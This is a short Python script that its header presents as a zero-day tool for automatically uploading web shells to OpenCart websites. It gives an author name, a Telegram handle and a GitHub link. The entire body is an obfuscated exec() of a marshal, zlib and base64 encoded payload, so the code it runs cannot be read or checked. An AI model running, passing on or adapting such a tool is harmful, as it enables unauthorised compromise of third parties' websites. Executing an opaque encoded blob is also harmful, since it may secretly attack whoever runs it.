# Date : 24/07/2023
# Coded By : Capitos Kamal
# SCRIPT : 0day Auto Upload Shell on opencart websites
# Telegram : @CapitosKamal
# Github : http://github.com/kamalkarlos

import marshal,zlib,base64
exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))